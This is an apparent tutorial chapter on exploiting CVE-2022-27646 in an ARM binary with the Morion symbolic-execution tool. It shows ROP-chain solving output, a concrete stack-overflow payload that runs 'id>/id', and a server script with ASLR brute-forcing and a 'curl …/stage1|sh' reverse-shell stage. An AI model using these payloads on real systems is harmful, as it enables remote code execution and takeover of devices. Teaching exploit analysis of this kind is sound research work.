# Table of Contents
0. [Introduction](../README.md#introduction)
1. [Setup](./1_setup.md)
2. [Emulation](./2_emulation.md)
3. [Vulnerability CVE-2022-27646](./3_vulnerability.md)
4. [Tracing](./4_tracing.md)
5. [Symbolic Execution](./5_symbex.md)
6. [Exploitation](./6_exploitation.md#exploitation)
    1. [morion_control_hijacker](./6_exploitation.md#morion_control_hijacker)
    2. [morion_rop_generator](./6_exploitation.md#morion_rop_generator)
<!--TODO--------------------------------------------------------------------------------------------
- [ ] Do in all chapters: ``` -> ```shell or ```python
- [ ] Table of Contents
- [ ] Try out manual exploit
- [ ] Can morion_rop_generator merge the payloads?
- [ ] Can we integrate morion/circled.rop3.py to circled.server.py?
- [ ] Document gdb debug output to show payload works
- [ ] Create screencast using morion_pwndbg
- [ ] Remove circled.exploit.md and circled.exploit.py from git repository
- [ ] Why do we have `var:s+0`?
--------------------------------------------------------------------------------------------------->
# Exploitation
## morion_control_hijacker
### Symbolic PC
`morion_control_hijacker --skip_state_analysis circled.yaml`:
```
[...]
[2024-04-11 11:35:34] [DEBG] 0x0000cf1c (ff df 8d e2): add sp, sp, #0x3fc
[2024-04-11 11:35:34] [DEBG] 0x0000cf20 (03 db 8d e2): add sp, sp, #0xc00
[2024-04-11 11:35:34] [DEBG] 0x0000cf24 (f0 8f bd e8): pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}
[2024-04-11 11:35:34] [WARN] [POST] Potential control hijack due to unrestricted register 'r11/fp'.
[...]
[2024-04-11 11:35:43] [WARN] [POST] Potential control hijack due to unrestricted register 'pc'.

                      _                   _          _ _ 
 _ __ ___   ___  _ __(_) ___  _ __    ___| |__   ___| | |
| '_ ` _ \ / _ \| '__| |/ _ \| '_ \  / __| '_ \ / _ \ | |
| | | | | | (_) | |  | | (_) | | | | \__ \ | | |  __/ | |
|_| |_| |_|\___/|_|  |_|\___/|_| |_| |___/_| |_|\___|_|_|
            
Investigate potential control hijack...

Available objects:
- ctx
- ast

Type quit(), exit() or ctrl-d to leave the interpreter.

In [1]: 
```
### ROP Chain

<figure>
  <img src="../images/ROP_Chain.svg" alt="ROP Chain"/>
  <figcaption>
    Fig. 1: ROP Chain - Showing ...
  </figcaption>
</figure>

### Payload Generation
[circled.rop1.py](../morion/circled.rop1.py#L10):
```python
[...]
# Preconditions gadget 0
g0_sp_val  = ctx.getConcreteRegisterValue(ctx.registers.sp)-9*4
g0_pc_ast  = ctx.getMemoryAst(MemoryAccess(g0_sp_val+8*4, 4))
g0_pc_val  = 0xc9b8

# Solve preconditions
model = ctx.getModel(g0_pc_ast  == g0_pc_val)
pprint(model)
```

```
In [1]: run -i circled.rop1.py
{
   392:  5132;;0xbeffc24c;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+392:8 = 0xb8,
   393:  5132;;0xbeffc24d;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+393:8 = 0xc9,
   394:  5132;;0xbeffc24e;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+394:8 = 0x00,
   395:  5132;;0xbeffc24f;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+395:8 = 0x00
}
```

[circled.rop2.py](../morion/circled.rop2.py#L10):
```python
[...]
# OS command
md5_sum_len = 32
cmd         = "id>/id;#"
cmd_addr    = 0xbeffc0c4+396

# Preconditions gadget 0
g0_sp_val  = ctx.getConcreteRegisterValue(ctx.registers.sp)-9*4
g0_pc_ast  = ctx.getMemoryAst(MemoryAccess(g0_sp_val+8*4, 4))
g0_pc_val  = 0xc9b8
g0_r6_ast  = ctx.getMemoryAst(MemoryAccess(g0_sp_val+2*4, 4))
g0_r6_val  = cmd_addr
g0__r6_ast = ctx.getMemoryAst(MemoryAccess(cmd_addr, 16))
g0__r6_val = int.from_bytes(bytes(cmd, "UTF-8"), byteorder="little")

# Solve preconditions
model = ctx.getModel(ast.land([
                g0_pc_ast  == g0_pc_val,
                g0_r6_ast  == g0_r6_val,
                g0__r6_ast == g0__r6_val,
            ]))
pprint(model)
```

```
In [2]: run -i circled.rop2.py
{
   368:  5132;;0xbeffc234;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+368:8 = 0x50,
   369:  5132;;0xbeffc235;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+369:8 = 0xc2,
   370:  5132;;0xbeffc236;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+370:8 = 0xff,
   371:  5132;;0xbeffc237;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+371:8 = 0xbe,
   392:  5132;;0xbeffc24c;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+392:8 = 0xb8,
   393:  5132;;0xbeffc24d;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+393:8 = 0xc9,
   394:  5132;;0xbeffc24e;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+394:8 = 0x00,
   395:  5132;;0xbeffc24f;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+395:8 = 0x00,
  1419: 15451;;0xbeffc250;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+396:8 = 0x69,
  1420: 15451;;0xbeffc251;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+397:8 = 0x64,
  1421: 15451;;0xbeffc252;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+398:8 = 0x3e,
  1422: 15451;;0xbeffc253;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+399:8 = 0x2f,
  1423: 15451;;0xbeffc254;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+400:8 = 0x69,
  1424: 15451;;0xbeffc255;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+401:8 = 0x64,
  1425: 15451;;0xbeffc256;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+402:8 = 0x3b,
  1426: 15451;;0xbeffc257;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+403:8 = 0x23,
  1427: 15451;;0xbeffc258;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+404:8 = 0x00,
  1428: 15451;;0xbeffc259;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+405:8 = 0x00,
  1429: 15451;;0xbeffc25a;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+406:8 = 0x00,
  1430: 15451;;0xbeffc25b;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+407:8 = 0x00,
  1431: 15451;;0xbeffc25c;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+408:8 = 0x00,
  1432: 15451;;0xbeffc25d;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+409:8 = 0x00,
  1433: 15451;;0xbeffc25e;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+410:8 = 0x00,
  1434: 15451;;0xbeffc25f;model;fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0);s+411:8 = 0x00
}
```

[circled.rop3.py](../morion/circled.rop3.py#L17):
```python
[...]
    # Payload generation
    payload  = b"A"*368
    payload += b"\x50\xc2\xff\xbe"
    payload += b"B"*20
    payload += b"\xb8\xc9\x00\x00"
    payload += b"\x69\x64\x3e\x2f"
    payload += b"\x69\x64\x3b\x23"
    payload += b"C"*617
    payload += b" X"
[...]
```

## morion_rop_generator

[circled.init.yaml](../morion/circled.init.yaml#L37):
```
[...]
ropchains:
  default:
    - preconditions:
        mems:
          '[sp+32+0]': '0xb8' # pc == [sp+8*4] == 0x0000c9b8
          '[sp+32+1]': '0xc9'
          '[sp+32+2]': '0x00'
          '[sp+32+3]': '0x00'
      instruction:
        ['0x0000cf24', 'f0 8f bd e8', 'pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}', 'Gadget 0.0']
    - preconditions:
      instruction:
        ['0x0000c9b8', '06 00 a0 e1', 'mov r0, r6', 'Gadget 1.0']
    - preconditions:
        regs:
          'r0': '0xbeffc250'    # r6 == 0xbeffc0c4+396 == 0xbeffc250
        mems:
          '0xbeffc250': '0x69'  # 'i'
          '0xbeffc251': '0x64'  # 'd'
          '0xbeffc252': '0x3e'  # '>'
          '0xbeffc253': '0x2f'  # '/'
          '0xbeffc254': '0x69'  # 'i'
          '0xbeffc255': '0x64'  # 'd'
          '0xbeffc256': '0x3b'  # ';'
          '0xbeffc257': '0x23'  # '#'
          '0xbeffc258': '0x00'  #
      instruction:
        ['0x0000c9bc', 'b7 f2 ff eb', 'bl #0x94a0', 'Gadget 1.1']
```

`morion_rop_generator circled.yaml default`:
```
[...]
[2024-04-16 14:16:04] [DEBG] 0x0000cf1c (ff df 8d e2): add sp, sp, #0x3fc
[2024-04-16 14:16:04] [DEBG] 0x0000cf20 (03 db 8d e2): add sp, sp, #0xc00
[2024-04-16 14:16:04] [INFO] ... finished symbolic execution (pc=0x0000cf24).
[2024-04-16 14:16:04] [INFO] Start loading preconditions of instruction 0 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] Regs:
[2024-04-16 14:16:04] [DEBG] Mems:
[2024-04-16 14:16:04] [DEBG] 	0xbeffc84c == 0xb8
[2024-04-16 14:16:04] [DEBG] 	0xbeffc84d == 0xc9
[2024-04-16 14:16:04] [DEBG] 	0xbeffc84e == 0x00
[2024-04-16 14:16:04] [DEBG] 	0xbeffc84f == 0x00
[2024-04-16 14:16:04] [INFO] ... finished loading preconditions of instruction 0 in ROP chain 'default'.
[2024-04-16 14:16:04] [INFO] Start solving preconditions of instruction 0 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] Solution:
[2024-04-16 14:16:04] [DEBG] 	0xbeffc24c: 0xb8 [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+392]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc24d: 0xc9 [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+393]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc24e: 0x00 [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+394]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc24f: 0x00 [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+395]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc0c4: 0xff [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+0]
[2024-04-16 14:16:04] [INFO] ... finished solving preconditions of instruction 0 in ROP chain 'default'.
[2024-04-16 14:16:04] [INFO] Start concretizing preconditions of instruction 0 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] Regs:
[2024-04-16 14:16:04] [DEBG] Mems:
[2024-04-16 14:16:04] [DEBG] 	0xbeffc84c: 0xb8
[2024-04-16 14:16:04] [DEBG] 	0xbeffc84d: 0xc9
[2024-04-16 14:16:04] [DEBG] 	0xbeffc84e: 0x00
[2024-04-16 14:16:04] [DEBG] 	0xbeffc84f: 0x00
[2024-04-16 14:16:04] [INFO] ... finished concretizing preconditions of instruction 0 in ROP chain 'default'...
[2024-04-16 14:16:04] [INFO] Start symbolic execution of instruction 0 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] 0x0000cf24 (f0 8f bd e8): pop {r4, r5, r6, r7, r8, sb, sl, fp, pc}# Gadget 0.0                                      
[2024-04-16 14:16:04] [INFO] ... finished symbolic execution of instruction 0 in ROP chain 'default'.
[2024-04-16 14:16:04] [INFO] Start loading preconditions of instruction 1 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] Regs:
[2024-04-16 14:16:04] [DEBG] Mems:
[2024-04-16 14:16:04] [INFO] ... finished loading preconditions of instruction 1 in ROP chain 'default'.
[2024-04-16 14:16:04] [INFO] Start solving preconditions of instruction 1 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] Instruction 1 of ROP chain 'default' has no preconditions.
[2024-04-16 14:16:04] [INFO] ... finished solving preconditions of instruction 1 in ROP chain 'default'.
[2024-04-16 14:16:04] [INFO] Start concretizing preconditions of instruction 1 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] Regs:
[2024-04-16 14:16:04] [DEBG] Mems:
[2024-04-16 14:16:04] [INFO] ... finished concretizing preconditions of instruction 1 in ROP chain 'default'...
[2024-04-16 14:16:04] [INFO] Start symbolic execution of instruction 1 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] 0x0000c9b8 (06 00 a0 e1): mov r0, r6              # Gadget 1.0                                      
[2024-04-16 14:16:04] [INFO] ... finished symbolic execution of instruction 1 in ROP chain 'default'.
[2024-04-16 14:16:04] [INFO] Start loading preconditions of instruction 2 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] Regs:
[2024-04-16 14:16:04] [DEBG] 	r0 == 0xbeffc290
[2024-04-16 14:16:04] [DEBG] Mems:
[2024-04-16 14:16:04] [DEBG] 	0xbeffc290 == 0x69
[2024-04-16 14:16:04] [DEBG] 	0xbeffc291 == 0x64
[2024-04-16 14:16:04] [DEBG] 	0xbeffc292 == 0x3e
[2024-04-16 14:16:04] [DEBG] 	0xbeffc293 == 0x2f
[2024-04-16 14:16:04] [DEBG] 	0xbeffc294 == 0x69
[2024-04-16 14:16:04] [DEBG] 	0xbeffc295 == 0x64
[2024-04-16 14:16:04] [DEBG] 	0xbeffc296 == 0x3b
[2024-04-16 14:16:04] [DEBG] 	0xbeffc297 == 0x23
[2024-04-16 14:16:04] [DEBG] 	0xbeffc298 == 0x00
[2024-04-16 14:16:04] [INFO] ... finished loading preconditions of instruction 2 in ROP chain 'default'.
[2024-04-16 14:16:04] [INFO] Start solving preconditions of instruction 2 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] Solution:
[2024-04-16 14:16:04] [DEBG] 	0xbeffc234: 0x90 [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+368]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc235: 0xc2 [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+369]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc236: 0xff [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+370]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc237: 0xbe [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+371]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc24c: 0xb8 [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+392]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc24d: 0xc9 [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+393]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc24e: 0x00 [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+394]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc24f: 0x00 [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+395]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc0c4: 0xff [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+0]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc290: 0x69 [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+460]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc291: 0x64 [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+461]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc292: 0x3e [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+462]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc293: 0x2f [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+463]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc294: 0x69 [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+464]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc295: 0x64 [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+465]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc296: 0x3b [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+466]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc297: 0x23 [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+467]
[2024-04-16 14:16:04] [DEBG] 	0xbeffc298: 0x00 [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+468]
[2024-04-16 14:16:04] [INFO] ... finished solving preconditions of instruction 2 in ROP chain 'default'.
[2024-04-16 14:16:04] [INFO] Start concretizing preconditions of instruction 2 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] Regs:
[2024-04-16 14:16:04] [DEBG] 	r0: 0xbeffc290
[2024-04-16 14:16:04] [DEBG] Mems:
[2024-04-16 14:16:04] [DEBG] 	0xbeffc290: 0x69
[2024-04-16 14:16:04] [DEBG] 	0xbeffc291: 0x64
[2024-04-16 14:16:04] [DEBG] 	0xbeffc292: 0x3e
[2024-04-16 14:16:04] [DEBG] 	0xbeffc293: 0x2f
[2024-04-16 14:16:04] [DEBG] 	0xbeffc294: 0x69
[2024-04-16 14:16:04] [DEBG] 	0xbeffc295: 0x64
[2024-04-16 14:16:04] [DEBG] 	0xbeffc296: 0x3b
[2024-04-16 14:16:04] [DEBG] 	0xbeffc297: 0x23
[2024-04-16 14:16:04] [DEBG] 	0xbeffc298: 0x00
[2024-04-16 14:16:04] [INFO] ... finished concretizing preconditions of instruction 2 in ROP chain 'default'...
[2024-04-16 14:16:04] [INFO] Start symbolic execution of instruction 2 in ROP chain 'default'...
[2024-04-16 14:16:04] [DEBG] 0x0000c9bc (b7 f2 ff eb): bl #0x94a0              # Gadget 1.1
[2024-04-16 14:16:04] [INFO] ... finished symbolic execution of instruction 2 in ROP chain 'default'.
[2024-04-16 14:16:04] [INFO] Start storing file 'circled.yaml'...
[2024-04-16 14:16:06] [INFO] ... finished storing file 'circled.yaml'.
[2024-04-16 14:16:06] [INFO] Start dumping payloads...
Payload [inst:5132][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+0]:
s+0000: 41 41 41 41 41 41 41 41
[...]
s+0360: 41 41 41 41 41 41 41 41
s+0368: 90 c2 ff be 42 42 42 42
s+0376: 42 42 42 42 42 42 42 42
s+0384: 42 42 42 42 42 42 42 42
s+0392: b8 c9 00 00
---
Payload [inst:15451][mem][model:fgets@libc(s=0xbeffc0c4,n=1024,stream=0x21ae0)][var:s+0]:
s+0000: ff 43 43 43 43 43 43 43
s+0008: 43 43 43 43 43 43 43 43
[...]
s+0448: 43 43 43 43 43 43 43 43
s+0456: 43 43 43 43 69 64 3e 2f
s+0464: 69 64 3b 23 00
---
[2024-04-16 14:16:06] [INFO] ... finished dumping payloads.
```

- CyberChef *From Hex* (Delimiter: `Space`) | *To Hex* (Delimiter: `0x with comma`)
- Merge payloads since they originate from the same file

##
- Explain `circled.server.py`
- Test reverse shell payload
- Explain reverse shell payload
- Add screencast
[circled.server.py](../server/circled.server.py#L42)
```python
[...]
        # Serve requests for circleinfo.txt
        if payload == "leg":
            return self.serve_file("resources/circleinfo.txt")
        elif payload == "pov":
            return b"A"*1021 + b" X"
        elif payload == "rsh":
            cmd = "curl http://127.0.0.1:5000/stage1|sh"
        else:
            cmd = payload

        # Replace spaces in the command (spaces cannot be used due to sscanf(str, "%s %s"))
        cmd = "touch$\t/tmp/st0;" + cmd.replace(" ", "\t") + ";#"

        # Generate payload
        p  = b"A"*368                                   # [   0: 367]
        p += cmd_addr.to_bytes(4, "little")             # [ 368: 371] g0_r6_val (stack addr. of OS command)
        p += b"B"*20                                    # [ 372: 391]
        p += b"\xb8\xc9\x00\x00"                        # [ 392: 395] g0_pc_val (code addr. of ROP gadget 1: mov r0, r6; bl #0x94a0 <system@plt>)
        max_cmd_len = 1024-len(p)-2-2
        p += b"X"*max(0, (max_cmd_len-len(cmd))) + b";" # [ 396:   L] Fill up with an nonexistent command
        p += bytes(cmd, "UTF-8")[:max_cmd_len]          # [ L+1:1020] OS command to execute
        p += b" X"                                      # String separator: sscanf(str, "%s %s", ...)
        print(f"[*] Stage 0 payload: 0x{cmd_addr:08x} '{cmd:s}'")

        # Brute force the stack
        HttpHandler.cmd_addr = cmd_addr - 0x1000
[...]
```
We fill up with a nonexistent command `X...X;cmd` to improve ASLR brute-forcing?
## Todo
- Note: The shown exploit could easily be generated without using symbolic execution. However, we
    have chosen it since it is rather easy to follow along and suitable to explain how Morion works.

----------------------------------------------------------------------------------------------------
[Back-to-Top](./6_exploitation.md#table-of-contents)